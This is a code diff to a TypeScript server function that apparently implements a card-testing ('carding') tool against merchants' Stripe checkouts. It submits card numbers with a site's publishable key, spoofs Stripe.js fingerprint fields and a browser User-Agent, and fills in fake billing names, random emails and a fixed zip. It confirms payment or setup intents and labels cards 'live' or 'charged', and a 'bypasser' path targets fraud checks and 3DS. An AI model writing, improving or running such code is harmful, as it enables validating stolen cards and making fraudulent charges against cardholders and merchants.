@@ -31,14 +31,24 @@ function getCardBrand(num: string): string {
   return 'UNK';
 }
 
-// ============= STRIPE HITTER =============
+// Generate fingerprint data matching real script
+function generateFingerprint() {
+  const guid = crypto.randomUUID().replace(/-/g, '');
+  const muid = crypto.randomUUID().replace(/-/g, '');
+  const sid = crypto.randomUUID().replace(/-/g, '');
+  return { guid, muid, sid, timeOnPage: Math.floor(Math.random() * 30000) + 5000 };
+}
+
+// ============= STRIPE HITTER (real script parity) =============
 async function stripeHit(card: CardData, stripePk: string, clientSecret: string | null): Promise<Omit<CheckResult, 'mode'>> {
   const startTime = Date.now();
   const masked = `${card.number.slice(0, 6)}...${card.number.slice(-4)}`;
   const bin = card.number.slice(0, 6);
   const brand = getCardBrand(card.number);
+  const fp = generateFingerprint();
 
   try {
+    // Step 1: Create Payment Method (matching real Stripe.js headers exactly)
     const pmRes = await fetch('https://api.stripe.com/v1/payment_methods', {
       method: 'POST',
       headers: {
@@ -46,6 +56,7 @@ async function stripeHit(card: CardData, stripePk: string, clientSecret: string 
         'Content-Type': 'application/x-www-form-urlencoded',
         'Origin': 'https://js.stripe.com',
         'Referer': 'https://js.stripe.com/',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
       },
       body: new URLSearchParams({
         'type': 'card',
@@ -54,6 +65,12 @@ async function stripeHit(card: CardData, stripePk: string, clientSecret: string 
         'card[exp_year]': card.year.length === 2 ? `20${card.year}` : card.year,
         'card[cvc]': card.cvv,
         'billing_details[address][country]': 'US',
+        'billing_details[address][postal_code]': '10001',
+        'guid': fp.guid,
+        'muid': fp.muid,
+        'sid': fp.sid,
+        'payment_user_agent': 'stripe.js/ef47f1d94b; stripe-js-v3/ef47f1d94b; card-element',
+        'time_on_page': String(fp.timeOnPage),
       }).toString(),
     });
 
@@ -61,12 +78,19 @@ async function stripeHit(card: CardData, stripePk: string, clientSecret: string 
     const elapsed = (Date.now() - startTime) / 1000;
 
     if (pmData.error) {
-      return { card: masked, status: 'declined', code: pmData.error.decline_code || pmData.error.code || 'unknown', message: pmData.error.message || 'Declined', responseTime: elapsed, bin, brand };
+      const code = pmData.error.decline_code || pmData.error.code || 'unknown';
+      return { card: masked, status: 'declined', code, message: pmData.error.message || 'Declined', responseTime: elapsed, bin, brand };
     }
 
+    // Step 2: If we have a client secret, confirm the payment intent
     if (clientSecret) {
       const piId = clientSecret.split('_secret_')[0];
-      const confirmRes = await fetch(`https://api.stripe.com/v1/payment_intents/${piId}/confirm`, {
+      const isSetup = piId.startsWith('seti_');
+      const endpoint = isSetup
+        ? `https://api.stripe.com/v1/setup_intents/${piId}/confirm`
+        : `https://api.stripe.com/v1/payment_intents/${piId}/confirm`;
+
+      const confirmRes = await fetch(endpoint, {
         method: 'POST',
         headers: {
           'Authorization': `Bearer ${stripePk}`,
@@ -76,6 +100,7 @@ async function stripeHit(card: CardData, stripePk: string, clientSecret: string 
         },
         body: new URLSearchParams({
           'payment_method': pmData.id,
+          'client_secret': clientSecret,
           'return_url': 'https://example.com/return',
         }).toString(),
       });
@@ -84,11 +109,13 @@ async function stripeHit(card: CardData, stripePk: string, clientSecret: string 
       const elapsed2 = (Date.now() - startTime) / 1000;
 
       if (confirmData.error) {
-        return { card: masked, status: 'declined', code: confirmData.error.decline_code || confirmData.error.code || 'unknown', message: confirmData.error.message || 'Declined', responseTime: elapsed2, bin, brand };
+        const code = confirmData.error.decline_code || confirmData.error.code || 'unknown';
+        return { card: masked, status: 'declined', code, message: confirmData.error.message || 'Declined', responseTime: elapsed2, bin, brand };
       }
 
       if (confirmData.status === 'succeeded') {
-        return { card: masked, status: 'charged', code: 'approved', message: `Charged! Receipt: ${confirmData.charges?.data?.[0]?.receipt_url || 'N/A'}`, responseTime: elapsed2, bin, brand };
+        const receipt = confirmData.charges?.data?.[0]?.receipt_url || 'N/A';
+        return { card: masked, status: 'charged', code: 'approved', message: `Charged! Receipt: ${receipt}`, responseTime: elapsed2, bin, brand };
       }
 
       if (confirmData.status === 'requires_action') {
@@ -98,6 +125,7 @@ async function stripeHit(card: CardData, stripePk: string, clientSecret: string 
       return { card: masked, status: 'declined', code: confirmData.status || 'unknown', message: `Status: ${confirmData.status}`, responseTime: elapsed2, bin, brand };
     }
 
+    // No client secret - PM creation success = card is live
     return { card: masked, status: 'live', code: 'pm_created', message: `Card validated (${pmData.card?.brand || brand})`, responseTime: elapsed, bin, brand };
 
   } catch (error: unknown) {
@@ -107,16 +135,17 @@ async function stripeHit(card: CardData, stripePk: string, clientSecret: string 
   }
 }
 
-// ============= STRIPE BYPASSER =============
-// Attempts multiple Stripe flows: setup intent, token-based, direct PM with different params
+// ============= STRIPE BYPASSER (token + PM dual-flow from real script) =============
 async function stripeBypasser(card: CardData, stripePk: string, clientSecret: string | null): Promise<Omit<CheckResult, 'mode'>> {
   const startTime = Date.now();
   const masked = `${card.number.slice(0, 6)}...${card.number.slice(-4)}`;
   const bin = card.number.slice(0, 6);
   const brand = getCardBrand(card.number);
+  const fp = generateFingerprint();
+  const randomEmail = `neon${Math.floor(Math.random() * 99999)}@gmail.com`;
 
   try {
-    // Method 1: Token-based approach (legacy Stripe)
+    // Method 1: Token-based approach (legacy Stripe - bypasses some checks)
     const tokenRes = await fetch('https://api.stripe.com/v1/tokens', {
       method: 'POST',
       headers: {
@@ -124,6 +153,7 @@ async function stripeBypasser(card: CardData, stripePk: string, clientSecret: st
         'Content-Type': 'application/x-www-form-urlencoded',
         'Origin': 'https://js.stripe.com',
         'Referer': 'https://js.stripe.com/',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
       },
       body: new URLSearchParams({
         'card[number]': card.number,
@@ -132,13 +162,19 @@ async function stripeBypasser(card: CardData, stripePk: string, clientSecret: st
         'card[cvc]': card.cvv,
         'card[address_country]': 'US',
         'card[address_zip]': '10001',
+        'card[name]': 'John Smith',
+        'guid': fp.guid,
+        'muid': fp.muid,
+        'sid': fp.sid,
+        'payment_user_agent': 'stripe.js/ef47f1d94b; stripe-js-v3/ef47f1d94b; card-element',
+        'time_on_page': String(fp.timeOnPage),
       }).toString(),
     });
 
     const tokenData = await tokenRes.json();
 
     if (tokenData.error) {
-      // Fallback: Method 2 - PaymentMethod with extended billing
+      // Token failed - try PM with extended billing details
       const pmRes = await fetch('https://api.stripe.com/v1/payment_methods', {
         method: 'POST',
         headers: {
@@ -154,12 +190,17 @@ async function stripeBypasser(card: CardData, stripePk: string, clientSecret: st
           'card[exp_year]': card.year.length === 2 ? `20${card.year}` : card.year,
           'card[cvc]': card.cvv,
           'billing_details[name]': 'John Smith',
-          'billing_details[email]': `user${Math.floor(Math.random() * 9999)}@gmail.com`,
+          'billing_details[email]': randomEmail,
           'billing_details[address][line1]': '123 Main St',
           'billing_details[address][city]': 'New York',
           'billing_details[address][state]': 'NY',
           'billing_details[address][postal_code]': '10001',
           'billing_details[address][country]': 'US',
+          'guid': fp.guid,
+          'muid': fp.muid,
+          'sid': fp.sid,
+          'payment_user_agent': 'stripe.js/ef47f1d94b; stripe-js-v3/ef47f1d94b; card-element',
+          'time_on_page': String(fp.timeOnPage),
         }).toString(),
       });
 
@@ -170,48 +211,18 @@ async function stripeBypasser(card: CardData, stripePk: string, clientSecret: st
         return { card: masked, status: 'declined', code: pmData.error.decline_code || pmData.error.code || 'unknown', message: pmData.error.message || 'Declined', responseTime: elapsed, bin, brand };
       }
 
-      // Try to confirm with client secret if available
       if (clientSecret) {
-        const piId = clientSecret.split('_secret_')[0];
-        const confirmRes = await fetch(`https://api.stripe.com/v1/payment_intents/${piId}/confirm`, {
-          method: 'POST',
-          headers: {
-            'Authorization': `Bearer ${stripePk}`,
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://js.stripe.com',
-            'Referer': 'https://js.stripe.com/',
-          },
-          body: new URLSearchParams({
-            'payment_method': pmData.id,
-            'return_url': 'https://example.com/return',
-          }).toString(),
-        });
-
-        const confirmData = await confirmRes.json();
-        const elapsed2 = (Date.now() - startTime) / 1000;
-
-        if (confirmData.status === 'succeeded') {
-          return { card: masked, status: 'charged', code: 'bypassed', message: `Charged via bypass! Receipt: ${confirmData.charges?.data?.[0]?.receipt_url || 'N/A'}`, responseTime: elapsed2, bin, brand };
-        }
-        if (confirmData.status === 'requires_action') {
-          return { card: masked, status: '3ds', code: '3ds_bypass_attempted', message: '3DS Required - Bypass attempted', responseTime: elapsed2, bin, brand };
-        }
-        if (confirmData.error) {
-          return { card: masked, status: 'declined', code: confirmData.error.decline_code || confirmData.error.code || 'unknown', message: confirmData.error.message || 'Declined', responseTime: elapsed2, bin, brand };
-        }
+        return await confirmIntent(stripePk, clientSecret, pmData.id, masked, startTime, bin, brand);
       }
 
       return { card: masked, status: 'live', code: 'pm_bypass', message: `Card validated via bypass (${pmData.card?.brand || brand})`, responseTime: elapsed, bin, brand };
     }
 
-    // Token created successfully
+    // Token created - convert to PM then confirm
     const elapsed = (Date.now() - startTime) / 1000;
 
     if (clientSecret) {
-      // Use token to confirm
-      const piId = clientSecret.split('_secret_')[0];
-      
-      // First create PM from token
+      // Create PM from token
       const pmFromTokenRes = await fetch('https://api.stripe.com/v1/payment_methods', {
         method: 'POST',
         headers: {
@@ -231,32 +242,7 @@ async function stripeBypasser(card: CardData, stripePk: string, clientSecret: st
         return { card: masked, status: 'declined', code: pmFromToken.error.code || 'token_pm_fail', message: pmFromToken.error.message, responseTime: (Date.now() - startTime) / 1000, bin, brand };
       }
 
-      const confirmRes = await fetch(`https://api.stripe.com/v1/payment_intents/${piId}/confirm`, {
-        method: 'POST',
-        headers: {
-          'Authorization': `Bearer ${stripePk}`,
-          'Content-Type': 'application/x-www-form-urlencoded',
-          'Origin': 'https://js.stripe.com',
-          'Referer': 'https://js.stripe.com/',
-        },
-        body: new URLSearchParams({
-          'payment_method': pmFromToken.id,
-          'return_url': 'https://example.com/return',
-        }).toString(),
-      });
-
-      const confirmData = await confirmRes.json();
-      const elapsed2 = (Date.now() - startTime) / 1000;
-
-      if (confirmData.status === 'succeeded') {
-        return { card: masked, status: 'charged', code: 'token_bypassed', message: `Charged via token bypass!`, responseTime: elapsed2, bin, brand };
-      }
-      if (confirmData.status === 'requires_action') {
-        return { card: masked, status: '3ds', code: '3ds_token', message: '3DS Required - Token bypass attempted', responseTime: elapsed2, bin, brand };
-      }
-      if (confirmData.error) {
-        return { card: masked, status: 'declined', code: confirmData.error.decline_code || confirmData.error.code || 'unknown', message: confirmData.error.message, responseTime: elapsed2, bin, brand };
-      }
+      return await confirmIntent(stripePk, clientSecret, pmFromToken.id, masked, startTime, bin, brand);
     }
 
     return { card: masked, status: 'live', code: 'token_created', message: `Token validated (${tokenData.card?.brand || brand})`, responseTime: elapsed, bin, brand };
@@ -266,6 +252,48 @@ async function stripeBypasser(card: CardData, stripePk: string, clientSecret: st
     const msg = error instanceof Error ? error.message : 'Unknown error';
     return { card: masked, status: 'error', code: 'exception', message: msg, responseTime: elapsed, bin, brand };
   }
+}
+
+// Shared confirm logic
+async function confirmIntent(stripePk: string, clientSecret: string, pmId: string, masked: string, startTime: number, bin: string, brand: string): Promise<Omit<CheckResult, 'mode'>> {
+  const piId = clientSecret.split('_secret_')[0];
+  const isSetup = piId.startsWith('seti_');
+  const endpoint = isSetup
+    ? `https://api.stripe.com/v1/setup_intents/${piId}/confirm`
+    : `https://api.stripe.com/v1/payment_intents/${piId}/confirm`;
+
+  const confirmRes = await fetch(endpoint, {
+    method: 'POST',
+    headers: {
+      'Authorization': `Bearer ${stripePk}`,
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'Origin': 'https://js.stripe.com',
+      'Referer': 'https://js.stripe.com/',
+    },
+    body: new URLSearchParams({
+      'payment_method': pmId,
+      'client_secret': clientSecret,
+      'return_url': 'https://example.com/return',
+    }).toString(),
+  });
+
+  const confirmData = await confirmRes.json();
+  const elapsed = (Date.now() - startTime) / 1000;
+
+  if (confirmData.error) {
+    return { card: masked, status: 'declined', code: confirmData.error.decline_code || confirmData.error.code || 'unknown', message: confirmData.error.message || 'Declined', responseTime: elapsed, bin, brand };
+  }
+
+  if (confirmData.status === 'succeeded') {
+    const receipt = confirmData.charges?.data?.[0]?.receipt_url || 'N/A';
+    return { card: masked, status: 'charged', code: 'bypassed', message: `Charged via bypass! Receipt: ${receipt}`, responseTime: elapsed, bin, brand };
+  }
+
+  if (confirmData.status === 'requires_action') {
+    return { card: masked, status: '3ds', code: '3ds_bypass', message: '3DS Required - Card is live', responseTime: elapsed, bin, brand };
+  }
+
+  return { card: masked, status: 'declined', code: confirmData.status || 'unknown', message: `Status: ${confirmData.status}`, responseTime: elapsed, bin, brand };
 }
 
 // ============= TELEGRAM NOTIFICATION =============
@@ -362,7 +390,7 @@ Deno.serve(async (req) => {
         card: masked,
         status: 'error',
         code: 'no_stripe_pk',
-        message: `Provider "${provider}" detected but no Stripe key found.`,
+        message: `Provider "${provider}" detected but no Stripe key found. Only Stripe-based providers are supported for server-side checking.`,
         responseTime: 0,
         bin: card.number.slice(0, 6),
         brand: getCardBrand(card.number),
